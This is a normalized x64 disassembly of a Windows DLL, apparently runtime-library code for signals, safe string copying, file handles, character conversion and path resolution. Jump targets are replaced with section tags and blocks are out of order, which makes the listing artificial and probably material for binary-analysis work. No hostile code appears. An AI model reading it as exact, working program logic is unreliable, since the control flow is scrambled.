shr eax 0x1f
not eax
and eax 0x1
jmp r-xdata
sub_18000f014
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov ebx ecx
xor edi edi
mov [ rsp + 0x70 ] edi
xor esi esi
mov edx ecx
sub edx 0x2
je r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
mov edi 0x1
mov [ rsp + 0x70 ] edi
sub edx 0x2
je r-xdata
test r13 r13
jne r-xdata
xor eax eax
jmp r-xdata
call sub_18000682c
mov rsi rax
test rax rax
jne r-xdata
sub edx 0x2
je r-xdata
test edi edi
je r-xdata
lea ecx [ r13 + 0x3 ]
call sub_180007060
int3
lea r11 [ rsp + 0x40 ]
mov rbx [ r11 + 0x38 ]
mov rsi [ r11 + 0x40 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov rdx [ rax + 0xa0 ]
mov rcx rdx
movsxd r8 [ rw-data ]
or eax 0xffffffff
jmp r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
mov edi 0x1
mov [ rsp + 0x70 ] edi
jmp r-xdata
sub edx 0x2
je r-xdata
cmp ebx 0x8
je r-xdata
xor ecx ecx
call sub_18000bc50
nop
mov rax r8
shl rax 0x4
add rax rdx
cmp rcx rax
jae r-xdata
add rcx 0x10
mov rax r8
shl rax 0x4
add rax rdx
cmp rcx rax
jb r-xdata
call DecodePointer
mov r13 rax
sub edx 0x3
je r-xdata
mov r15 [ rsi + 0xa8 ]
mov [ rsp + 0x38 ] r15
and [ rsi + 0xa8 ] 0x0
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
xor ecx ecx
cmp [ rcx + 0x4 ] ebx
je r-xdata
cmp [ rcx + 0x4 ] ebx
je r-xdata
sub edx 0x4
je r-xdata
mov r14d [ rsp + 0x70 ]
mov r14d [ rsi + 0xb0 ]
mov [ rsi + 0xb0 ] 0x8c
jmp r-xdata
cmp ebx 0x4
je r-xdata
cmp r13 0x1
jne r-xdata
lea r12 [ rcx + 0x8 ]
mov r13 [ r12 ]
jmp r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
mov edi 0x1
mov [ rsp + 0x70 ] edi
jmp r-xdata
sub edx 0x6
je r-xdata
call __imp_EncodePointer
mov [ r12 ] rax
mov ecx [ rw-data ]
mov edx ecx
mov [ rsp + 0x30 ] ecx
cmp ebx 0x8
jne r-xdata
mov r15 [ rsp + 0x38 ]
mov r14d [ rsp + 0x70 ]
jmp r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
mov edi 0x1
mov [ rsp + 0x70 ] edi
jmp r-xdata
cmp edx 0x1
je r-xdata
mov edi 0x8
cmp ebx edi
jne r-xdata
xor ecx ecx
call sub_18000bb50
test edi edi
je r-xdata
movsxd rcx edx
add rcx rcx
mov rax [ rsi + 0xa0 ]
and [ rax + rcx * 8 + 0x8 ] 0x0
inc edx
mov [ rsp + 0x30 ] edx
mov ecx [ rw-data ]
jmp r-xdata
call sub_1800075a8
mov [ rax ] 0x16
and [ rsp + 0x20 ] rsi
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008530
or eax 0xffffffff
jmp r-xdata
mov ecx ebx
call r13
mov edx [ rsi + 0xb0 ]
mov ecx edi
call r13
jmp r-xdata
mov eax [ rw-data ]
add ecx eax
cmp edx ecx
jge r-xdata
mov [ rsi + 0xa8 ] r15
cmp ebx edi
jne r-xdata
cmp ebx 0xb
je r-xdata
cmp ebx edi
je r-xdata
xor eax eax
mov [ rsi + 0xb0 ] r14d
cmp ebx 0x4
jne r-xdata
sub_18000f2d0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x40
mov ebp r8d
mov r13 rdx
mov r14 rcx
call __imp_EncodePointer
xor ebx ebx
mov rdi rax
cmp [ rw-data ] rbx
jne r-xdata
mov rax [ rw-data ]
lea rcx [ r--data ]
call [ LoadLibraryA@IAT ]
mov rsi rax
test rax rax
je r-xdata
mov rcx [ rw-data ]
cmp rcx rdi
je r-xdata
cmp r11 rdi
je r-xdata
xor eax eax
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
je r-xdata
mov rcx [ rw-data ]
call DecodePointer
test rax rax
je r-xdata
call DecodePointer
test rax rax
je r-xdata
mov rcx rax
call DecodePointer
mov rcx [ rw-data ]
mov rsi rax
call DecodePointer
mov r12 rax
test rsi rsi
je r-xdata
mov rcx rax
call EncodePointer
lea rdx [ r--data ]
mov rcx rsi
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
mov rcx rax
call EncodePointer
lea rdx [ r--data ]
mov rcx rsi
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
mov rcx rax
call EncodePointer
lea rdx [ r--data ]
mov rcx rsi
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
mov rcx rax
call EncodePointer
mov r11 rax
mov [ rw-data ] rax
test rax rax
je r-xdata
mov r9d ebp
mov r8 r13
mov rdx r14
mov rcx rbx
call rax
jmp r-xdata
call rax
mov rbx rax
test rax rax
je r-xdata
test rax rax
je r-xdata
mov rax [ rw-data ]
jmp r-xdata
lea rdx [ r--data ]
mov rcx rsi
call [ GetProcAddress@IAT ]
mov rcx rax
call EncodePointer
mov [ rw-data ] rax
jmp r-xdata
mov rbx [ rsp + 0x70 ]
mov rbp [ rsp + 0x78 ]
add rsp 0x40
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov rcx [ rw-data ]
cmp rcx rdi
je r-xdata
call rsi
test rax rax
je r-xdata
cmp rax rdi
je r-xdata
mov r11 [ rw-data ]
call DecodePointer
test rax rax
je r-xdata
bts ebp 0x15
jmp r-xdata
lea rcx [ rsp + 0x88 ]
mov r9d 0xc
lea r8 [ rsp + 0x30 ]
mov [ rsp + 0x20 ] rcx
lea edx [ r9 - 0xb ]
mov rcx rax
call r12
test eax eax
je r-xdata
mov rcx rbx
call rax
mov rbx rax
test [ rsp + 0x38 ] 0x1
jne r-xdata
sub_18000f4c4
push rbx
sub rsp 0x30
mov r9 rcx
test rcx rcx
je r-xdata
call sub_1800075a8
mov ebx 0x16
test rdx rdx
je r-xdata
test r8 r8
jne r-xdata
cmp [ rcx ] 0x0
je r-xdata
mov [ rcx ] r8b
test rdx rdx
jne r-xdata
inc rcx
sub rdx 0x1
jne r-xdata
mov al [ r8 ]
inc r8
mov [ rcx ] al
inc rcx
test al al
je r-xdata
mov [ r9 ] dl
jmp r-xdata
test rdx rdx
jne r-xdata
sub rdx 0x1
jne r-xdata
xor eax eax
jmp r-xdata
mov [ r9 ] dl
call sub_1800075a8
mov ebx 0x22
jmp r-xdata
add rsp 0x30
pop rbx
retn
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] ebx
call sub_180008530
mov eax ebx
sub_18000f550
push rbx
sub rsp 0x30
mov r11 r8
test r9 r9
jne r-xdata
test rcx rcx
je r-xdata
test rcx rcx
jne r-xdata
call sub_1800075a8
mov ebx 0x16
test rdx rdx
je r-xdata
test rdx rdx
jne r-xdata
test r9 r9
jne r-xdata
xor eax eax
jmp r-xdata
test r8 r8
jne r-xdata
mov [ rcx ] r9b
jmp r-xdata
add rsp 0x30
pop rbx
retn
mov r10 rcx
mov r8 rdx
cmp r9 0xffffffffffffffff
jne r-xdata
mov [ rcx ] r8b
mov al [ r11 ]
inc r11
mov [ r10 ] al
inc r10
test al al
je r-xdata
mov al [ r11 ]
inc r11
mov [ r10 ] al
inc r10
test al al
je r-xdata
test r9 r9
jne r-xdata
sub r8 0x1
je r-xdata
test r8 r8
jne r-xdata
sub r8 0x1
jne r-xdata
mov [ r10 ] r9b
sub r9 0x1
jne r-xdata
cmp r9 0xffffffffffffffff
jne r-xdata
jmp r-xdata
mov [ rcx ] 0x0
call sub_1800075a8
mov ebx 0x22
jmp r-xdata
mov [ rcx + rdx - 0x1 ] r8b
lea eax [ r8 + 0x50 ]
jmp r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] ebx
call sub_180008530
mov eax ebx
sub_18000f628
push rbx
sub rsp 0x30
test rcx rcx
je r-xdata
call sub_1800075a8
mov ebx 0x16
test rdx rdx
je r-xdata
test r8 r8
jne r-xdata
mov r9 rcx
mov [ rcx ] r8b
test rdx rdx
jne r-xdata
sub rdx 0x1
jne r-xdata
xor eax eax
jmp r-xdata
mov [ rcx ] dl
call sub_1800075a8
mov ebx 0x22
jmp r-xdata
mov al [ r8 ]
inc r8
mov [ r9 ] al
inc r9
test al al
je r-xdata
add rsp 0x30
pop rbx
retn
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] ebx
call sub_180008530
mov eax ebx
sub_18000f69c
sub rsp 0x38
test ecx ecx
js r-xdata
call sub_1800075a8
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_180008530
or eax 0xffffffff
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
cmp ecx 0x3
jne r-xdata
add rsp 0x38
retn
mov eax [ rw-data ]
jmp r-xdata
sub_18000f6ec
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
movsxd rbx ecx
mov edi r8d
mov [ rsp + 0x38 ] rdx
mov ecx ebx
call sub_18000fe4c
cmp rax 0xffffffffffffffff
jne r-xdata
mov edx [ rsp + 0x38 ]
lea r8 [ rsp + 0x3c ]
mov r9d edi
mov rcx rax
call [ SetFilePointer@IAT ]
mov [ rsp + 0x38 ] eax
cmp eax 0xffffffff
jne r-xdata
call sub_1800075a8
mov [ rax ] 0x9
mov rcx rbx
mov rax rbx
lea rdx [ rw-data ]
sar rax 0x5
and ecx 0x1f
mov rax [ rdx + rax * 8 ]
imul rcx rcx 0x58
and [ rax + rcx + 0x8 ] 0xfd
mov rax [ rsp + 0x38 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov ecx eax
call sub_1800075e8
jmp r-xdata
or rax 0xffffffffffffffff
jmp r-xdata
sub_18000f784
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x8 ] ecx
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov r12d r8d
mov r13 rdx
movsxd rbx ecx
cmp ebx 0xfffffffe
jne r-xdata
xor edi edi
cmp ebx edi
jl r-xdata
call sub_1800075c8
xor edi edi
mov [ rax ] edi
call sub_1800075a8
mov [ rax ] 0x9
or rax 0xffffffffffffffff
jmp r-xdata
call sub_1800075c8
mov [ rax ] edi
call sub_1800075a8
mov [ rax ] 0x9
mov [ rsp + 0x20 ] rdi
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008530
or rax 0xffffffffffffffff
cmp ebx [ rw-data ]
jae r-xdata
mov rbx [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov rsi rbx
mov r14 rbx
sar r14 0x5
lea r15 [ rw-data ]
and esi 0x1f
imul rsi rsi 0x58
mov rax [ r15 + r14 * 8 ]
movsx ecx [ rax + rsi + 0x8 ]
and ecx 0x1
jne r-xdata
mov ecx ebx
call sub_18000fed0
nop
mov rax [ r15 + r14 * 8 ]
test [ rax + rsi + 0x8 ] 0x1
je r-xdata
call sub_1800075c8
mov [ rax ] edi
call sub_1800075a8
mov [ rax ] 0x9
mov [ rsp + 0x20 ] rdi
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008530
or rax 0xffffffffffffffff
jmp r-xdata
call sub_1800075a8
mov [ rax ] 0x9
call sub_1800075c8
mov [ rax ] edi
or rdi 0xffffffffffffffff
mov r8d r12d
mov rdx r13
mov ecx ebx
call sub_18000f6ec
mov rdi rax
jmp r-xdata
mov ecx ebx
call sub_18000ff78
mov rax rdi
jmp r-xdata
sub_18000f8bc
push rbx
sub rsp 0x20
inc [ rw-data ]
mov rbx rcx
mov ecx 0x1000
call sub_180006ad0
mov [ rbx + 0x10 ] rax
test rax rax
je r-xdata
or [ rbx + 0x18 ] 0x4
lea rax [ rbx + 0x20 ]
mov [ rbx + 0x24 ] 0x2
mov [ rbx + 0x10 ] rax
or [ rbx + 0x18 ] 0x8
mov [ rbx + 0x24 ] 0x1000
jmp r-xdata
mov rax [ rbx + 0x10 ]
and [ rbx + 0x8 ] 0x0
mov [ rbx ] rax
add rsp 0x20
pop rbx
retn
sub_18000f910
sub rsp 0x38
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_1800075a8
mov [ rax ] 0x9
jmp r-xdata
call sub_1800075a8
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x9
call sub_180008530
cmp ecx [ rw-data ]
jae r-xdata
xor eax eax
movsxd rcx ecx
lea rdx [ rw-data ]
mov rax rcx
and ecx 0x1f
sar rax 0x5
imul rcx rcx 0x58
mov rax [ rdx + rax * 8 ]
movsx eax [ rax + rcx + 0x8 ]
and eax 0x40
jmp r-xdata
add rsp 0x38
retn
sub_18000f998
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x20 ] r9w
push rbp
push rsi
push rdi
sub rsp 0x60
xor ebp ebp
mov rdi r8
mov rsi rdx
mov rbx rcx
cmp rdx rbp
jne r-xdata
cmp rcx rbp
je r-xdata
cmp r8 rbp
jbe r-xdata
cmp r8 0x7fffffff
jbe r-xdata
or [ rcx ] 0xffffffff
cmp rcx rbp
je r-xdata
mov rdx [ rsp + 0xa0 ]
lea rcx [ rsp + 0x40 ]
call sub_180005710
mov r11 [ rsp + 0x40 ]
cmp [ r11 + 0x14 ] ebp
jne r-xdata
call sub_1800075a8
mov ebx 0x16
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] ebx
mov [ rsp + 0x20 ] rbp
call sub_180008530
xor eax eax
jmp r-xdata
mov [ rcx ] ebp
lea rax [ rsp + 0x88 ]
mov [ rsp + 0x88 ] ebp
mov ecx [ r11 + 0x4 ]
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x30 ] rbp
lea r8 [ rsp + 0x98 ]
mov r9d 0x1
xor edx edx
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rsi
call [ WideCharToMultiByte@IAT ]
cmp eax ebp
je r-xdata
movzx eax [ rsp + 0x98 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
mov rbx [ rsp + 0x80 ]
add rsp 0x60
pop rdi
pop rsi
pop rbp
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ rsp + 0x88 ] ebp
jne r-xdata
cmp rsi rbp
je r-xdata
cmp rsi rbp
je r-xdata
call sub_1800075a8
mov [ rax ] 0x2a
call sub_1800075a8
mov eax [ rax ]
cmp [ rsp + 0x58 ] bpl
je r-xdata
cmp rsi rbp
je r-xdata
cmp rbx rbp
je r-xdata
cmp rbx rbp
je r-xdata
cmp rdi rbp
ja r-xdata
cmp rdi rbp
jbe r-xdata
mov rcx [ rsp + 0x50 ]
and [ rcx + 0xc8 ] 0xfffffffd
call sub_1800075a8
mov ebx 0x22
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] ebx
mov [ rsp + 0x20 ] rbp
call sub_180008530
cmp [ rsp + 0x58 ] bpl
je r-xdata
cmp rdi rbp
jbe r-xdata
cmp [ rsp + 0x58 ] bpl
je r-xdata
mov [ rbx ] eax
jmp r-xdata
mov [ rbx ] 0x1
mov [ rsi ] al
call sub_1800075a8
mov ebx 0x22
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] ebx
mov [ rsp + 0x20 ] rbp
call sub_180008530
cmp [ rsp + 0x58 ] bpl
je r-xdata
mov r8 rdi
xor edx edx
mov rcx rsi
call sub_180009540
mov eax ebx
jmp r-xdata
mov rax [ rsp + 0x50 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
mov r8 rdi
xor edx edx
mov rcx rsi
call sub_180009540
mov rax [ rsp + 0x50 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
mov rcx [ rsp + 0x50 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
sub_18000fbbc
push rbx
sub rsp 0x30
mov rbx rcx
mov ecx 0xe
call sub_18000bc50
nop
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
mov ecx 0xe
call sub_18000bb50
add rsp 0x30
pop rbx
retn
mov rcx [ rw-data ]
mov [ rsp + 0x20 ] rcx
lea rdx [ rw-data ]
mov rcx [ rbx + 0x8 ]
call sub_180004690
and [ rbx + 0x8 ] 0x0
cmp [ rcx ] rax
jne r-xdata
mov rdx rcx
mov [ rsp + 0x20 ] rcx
jmp r-xdata
mov rax [ rcx + 0x8 ]
mov [ rdx + 0x8 ] rax
call sub_180004690
jmp r-xdata
test rcx rcx
je r-xdata
sub_18000fc40
sub rdx rcx
mov r9 rdx
test cl 0x7
je r-xdata
mov r11 0x8101010101010100
mov al [ rcx ]
mov dl [ rcx + r9 ]
cmp al dl
jne r-xdata
mov rax [ rcx ]
mov rdx [ rcx + r9 ]
cmp rax rdx
jne r-xdata
sbb rax rax
sbb rax 0xffffffffffffffff
retn
inc rcx
test al al
je r-xdata
mov r10 0x7efefefefefefeff
add r10 rdx
xor rax 0xffffffffffffffff
add rcx 0x8
xor rax r10
test r11 rax
je r-xdata
xor eax eax
retn
test rcx 0x7
jne r-xdata
lea rdx [ rcx + r9 ]
and dx 0xfff
cmp dx 0xff8
ja r-xdata
jmp r-xdata
nop
test dl dl
je r-xdata
xor eax eax
retn
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr rdx 0x10
test dl dl
je r-xdata
test dh dh
je r-xdata
shr edx 0x10
test dl dl
je r-xdata
test dh dh
jne r-xdata
sub_18000fcf0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rbx rdx
test ecx ecx
js r-xdata
call sub_1800075a8
mov [ rax ] 0x9
call sub_1800075c8
and [ rax ] 0x0
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
movsxd rdi ecx
lea rbp [ rw-data ]
mov rsi rdi
and edi 0x1f
sar rsi 0x5
imul rdi rdi 0x58
mov rax [ rbp + rsi * 8 ]
cmp [ rdi + rax ] 0xffffffffffffffff
jne r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov rax [ rbp + rsi * 8 ]
mov [ rdi + rax ] rbx
xor eax eax
jmp r-xdata
test ecx ecx
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
mov ecx 0xfffffff6
sub ecx 0x1
je r-xdata
mov ecx 0xfffffff5
jmp r-xdata
cmp ecx 0x1
jne r-xdata
call [ SetStdHandle@IAT ]
mov ecx 0xfffffff4
jmp r-xdata
sub_18000fda0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
push rdi
sub rsp 0x20
test ecx ecx
js r-xdata
call sub_1800075a8
mov [ rax ] 0x9
call sub_1800075c8
and [ rax ] 0x0
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
movsxd rbx ecx
lea rbp [ rw-data ]
mov rdi rbx
and ebx 0x1f
sar rdi 0x5
imul rbx rbx 0x58
mov rax [ rbp + rdi * 8 ]
test [ rax + rbx + 0x8 ] 0x1
je r-xdata
cmp [ rax + rbx ] 0xffffffffffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov rax [ rbp + rdi * 8 ]
or [ rbx + rax ] 0xffffffffffffffff
xor eax eax
jmp r-xdata
test ecx ecx
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov ecx 0xfffffff6
sub ecx 0x1
je r-xdata
mov ecx 0xfffffff5
jmp r-xdata
cmp ecx 0x1
jne r-xdata
xor edx edx
call [ SetStdHandle@IAT ]
mov ecx 0xfffffff4
jmp r-xdata
sub_18000fe4c
sub rsp 0x38
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_1800075c8
and [ rax ] 0x0
call sub_1800075a8
mov [ rax ] 0x9
jmp r-xdata
call sub_1800075c8
and [ rax ] 0x0
call sub_1800075a8
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x9
call sub_180008530
cmp ecx [ rw-data ]
jae r-xdata
or rax 0xffffffffffffffff
movsxd rdx ecx
lea rcx [ rw-data ]
mov rax rdx
and edx 0x1f
sar rax 0x5
imul rdx rdx 0x58
mov rax [ rcx + rax * 8 ]
test [ rax + rdx + 0x8 ] 0x1
je r-xdata
mov rax [ rax + rdx ]
jmp r-xdata
add rsp 0x38
retn
sub_18000fed0
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push r13
sub rsp 0x20
movsxd rbx ecx
mov r12 rbx
sar r12 0x5
lea r13 [ rw-data ]
and ebx 0x1f
imul rbx rbx 0x58
mov rsi [ r13 + r12 * 8 ]
mov edi 0x1
cmp [ rbx + rsi + 0xc ] 0x0
jne r-xdata
test edi edi
je r-xdata
lea ecx [ rdi + 0x9 ]
call sub_18000bc50
nop
cmp [ rbx + rsi + 0xc ] 0x0
jne r-xdata
mov eax edi
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rdi [ rsp + 0x40 ]
mov r12 [ rsp + 0x48 ]
add rsp 0x20
pop r13
retn
mov rcx [ r13 + r12 * 8 ]
lea rcx [ rcx + rbx + 0x10 ]
call [ EnterCriticalSection@IAT ]
mov ecx 0xa
call sub_18000bb50
lea rcx [ rbx + rsi + 0x10 ]
mov edx 0xfa0
call sub_18000f2a0
neg eax
sbb edx edx
and edi edx
inc [ rbx + rsi + 0xc ]
sub_18000ffa0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rdi
mov [ rsp + 0x18 ] r12
push r13
push r14
push r15
sub rsp 0x40
or r12 0xffffffffffffffff
mov r13d r12d
xor r14d r14d
lea ecx [ r12 + 0xc ]
call sub_18000bb68
test eax eax
jne r-xdata
mov ecx 0xb
call sub_18000bc50
nop
xor edi edi
mov [ rsp + 0x24 ] edi
lea rax [ rw-data ]
mov eax r12d
jmp r-xdata
mov ecx 0xb
call sub_18000bb50
mov eax r13d
movsxd r15 edi
mov rbx [ rax + r15 * 8 ]
test rbx rbx
je r-xdata
mov rbx [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
mov r12 [ rsp + 0x70 ]
add rsp 0x40
pop r15
pop r14
pop r13
retn
mov edx 0x58
lea ecx [ rdx - 0x38 ]
call sub_180006b3c
mov [ rsp + 0x30 ] rax
test rax rax
je r-xdata
mov [ rsp + 0x30 ] rbx
movsxd rdx edi
lea r8 [ rw-data ]
mov [ r8 + rdx * 8 ] rax
add [ rw-data ] 0x20
cmp r13d r12d
jne r-xdata
test [ rbx + 0x8 ] 0x1
jne r-xdata
shl edi 0x5
mov [ rsp + 0x20 ] edi
movsxd rcx edi
mov rax rcx
sar rax 0x5
and ecx 0x1f
imul rcx rcx 0x58
mov rax [ r8 + rax * 8 ]
mov [ rax + rcx + 0x8 ] 0x1
mov ecx edi
call sub_18000fed0
test eax eax
cmove edi r12d
mov r13d edi
mov [ rsp + 0x20 ] edi
mov [ rax + 0x8 ] 0x0
mov [ rax ] r12
mov [ rax + 0x9 ] 0xa
and [ rax + 0xc ] 0x0
add rax 0x58
mov [ rsp + 0x30 ] rax
jmp r-xdata
inc edi
mov [ rsp + 0x24 ] edi
lea rax [ rw-data ]
jmp r-xdata
add rbx 0x58
mov [ rsp + 0x30 ] rbx
or r12 0xffffffffffffffff
lea rax [ rw-data ]
jmp r-xdata
cmp [ rbx + 0xc ] 0x0
jne r-xdata
mov rcx [ r8 + rdx * 8 ]
add rcx 0xb00
cmp rax rcx
jae r-xdata
cmp edi 0x40
jge r-xdata
mov rax [ rax + r15 * 8 ]
add rax 0xb00
cmp rbx rax
jae r-xdata
test r14d r14d
jne r-xdata
mov ecx 0xa
call sub_18000bc50
nop
cmp [ rbx + 0xc ] 0x0
jne r-xdata
test r14d r14d
jne r-xdata
lea rcx [ rbx + 0x10 ]
call [ EnterCriticalSection@IAT ]
test [ rbx + 0x8 ] 0x1
je r-xdata
mov ecx 0xa
call sub_18000bb50
lea rcx [ rbx + 0x10 ]
mov edx 0xfa0
call sub_18000f2a0
test eax eax
jne r-xdata
mov [ rbx + 0x8 ] 0x1
mov [ rbx ] r12
lea r8 [ rw-data ]
sub rbx [ r8 + r15 * 8 ]
mov rax 0x2e8ba2e8ba2e8ba3
imul rbx
mov r13 rdx
sar r13 0x4
mov rax r13
shr rax 0x3f
add r13 rax
mov eax edi
shl eax 0x5
add r13d eax
mov [ rsp + 0x20 ] r13d
jmp r-xdata
or r12 0xffffffffffffffff
lea rcx [ rbx + 0x10 ]
call [ LeaveCriticalSection@IAT ]
jmp r-xdata
inc [ rbx + 0xc ]
lea r14d [ rax + 0x1 ]
mov [ rsp + 0x28 ] r14d
jmp r-xdata
sub_1800101bc
xor r9d r9d
cmp r8 r9
jne r-xdata
sub r8 0x1
jne r-xdata
xor eax eax
retn
movzx eax [ rcx ]
cmp ax r9w
je r-xdata
movzx eax [ rcx ]
movzx ecx [ rdx ]
sub eax ecx
retn
cmp ax [ rdx ]
jne r-xdata
add rcx 0x2
add rdx 0x2
sub_1800101ec
push rbx
push rbp
push rsi
push rdi
push r12
sub rsp 0x50
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x40 ] rax
xor r12d r12d
mov edi r8d
mov rbx rdx
mov esi ecx
cmp ecx r12d
je r-xdata
call sub_18000ae44
mov esi eax
call sub_180012a48
cmp eax r12d
jne r-xdata
mov ebp r12d
cmp edi r12d
jg r-xdata
cmp rbx r12
je r-xdata
call sub_1800075c8
mov [ rax ] 0xf
call sub_1800075a8
mov [ rax ] 0xd
mov eax 0x2e
mov [ rsp + 0x3a ] r12w
mov [ rsp + 0x38 ] ax
mov eax 0x3a
add si 0x40
mov [ rsp + 0x3e ] r12w
mov [ rsp + 0x3a ] ax
mov eax 0x2e
mov [ rsp + 0x38 ] si
mov [ rsp + 0x3c ] ax
jmp r-xdata
mov ebp edi
mov [ rbx ] r12w
jmp r-xdata
call sub_1800075a8
mov [ rax ] 0x16
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
mov ecx eax
call sub_1800075e8
cmp rbx r12
je r-xdata
lea r9 [ rsp + 0x30 ]
lea rcx [ rsp + 0x38 ]
mov r8 rbx
mov edx ebp
call [ GetFullPathNameW@IAT ]
cmp eax r12d
je r-xdata
cmp esi r12d
je r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r12
call sub_180008530
jmp r-xdata
cmp eax edi
mov edx 0x2
cmovg edi eax
movsxd rcx edi
call sub_1800103a8
mov rbx rax
cmp rax r12
jne r-xdata
cmp eax ebp
jge r-xdata
lea r9 [ rsp + 0x30 ]
lea rcx [ rsp + 0x38 ]
mov r8 rax
mov edx edi
call [ GetFullPathNameW@IAT ]
cmp eax r12d
je r-xdata
call sub_1800075a8
mov [ rax ] 0xc
call sub_1800075c8
mov [ rax ] 0x8
jmp r-xdata
call sub_1800075a8
mov [ rax ] 0x22
mov [ rbx ] r12w
jmp r-xdata
mov rax rbx
jmp r-xdata
cmp eax edi
jl r-xdata
mov rcx [ rsp + 0x40 ]
xor rcx rsp
call sub_1800042d0
add rsp 0x50
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
sub_180010364
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov ebx edx
mov rdi rcx
mov ecx 0x7
call sub_18000bc50
nop
mov r8d ebx
mov rdx rdi
xor ecx ecx
call sub_1800101ec
mov rbx rax
mov ecx 0x7
call sub_18000bb50
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_1800103a8
push rbx
sub rsp 0x20
and [ rsp + 0x40 ] 0x0
lea r8 [ rsp + 0x40 ]
call sub_18000ed34
mov rbx rax
test rax rax
jne r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
cmp [ rsp + 0x40 ] eax
je r-xdata
call sub_1800075a8
test rax rax
je r-xdata
call sub_1800075a8
mov ecx [ rsp + 0x40 ]
mov [ rax ] ecx
sub_1800103ec
mov r9 rcx
xor r8d r8d
movzx eax [ rcx ]
add rcx 0x2
cmp ax r8w
jne r-xdata
sub rcx 0x2
cmp rcx r9
je r-xdata
cmp [ rcx ] dx
cmove r8 rcx
mov rax r8
retn
cmp [ rcx ] dx
jne r-xdata
sub_180010418
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r15
sub rsp 0x20
mov rbp rdx
xor edi edi
xor edx edx
